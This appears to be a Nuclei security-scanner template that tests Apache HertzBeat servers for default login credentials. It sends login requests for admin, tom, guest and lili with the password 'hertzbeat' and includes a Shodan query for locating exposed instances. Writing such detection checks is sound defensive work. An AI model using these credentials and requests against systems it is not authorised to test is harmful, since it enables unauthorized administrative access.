id: apache-hertzbeat-default-login

info:
  name: Apache HertzBeat - Default Credentials
  author: securitytaters,icarot
  severity: high
  description: |
    Apache HertzBeat enables default admin (and others) credentials. An attacker can execute unauthorized operations.
  reference:
    - https://github.com/apache/hertzbeat
  classification:
    cpe: cpe:2.3:a:apache:hertzbeat:*:*:*:*:*:*:*:*
  metadata:
    max-request: 4
    verified: true
    shodan-query: title:"HertzBeat"
    vendor: apache
    product: hertzbeat
  tags: apache,hertzbeat,default-login,vuln

variables:
  password: hertzbeat

http:
  - raw:
      - |
        POST /api/account/auth/form HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"type":0,"identifier":"{{username}}","credential":"{{password}}"}

    attack: pitchfork
    payloads:
      username:
        - admin
        - tom
        - guest
        - lili

    matchers-condition: and
    matchers:
      - type: word
        name: hertzbeat
        cpe: cpe:2.3:a:apache:hertzbeat:*:*:*:*:*:*:*:*
        part: body
        words:
          - '"token":'
          - '{"data":{'
          - 'role":'
        condition: and

      - type: word
        name: hertzbeat-2
        cpe: cpe:2.3:a:apache:hertzbeat:*:*:*:*:*:*:*:*
        part: content_type
        words:
          - 'application/json'

      - type: status
        status:
          - 200
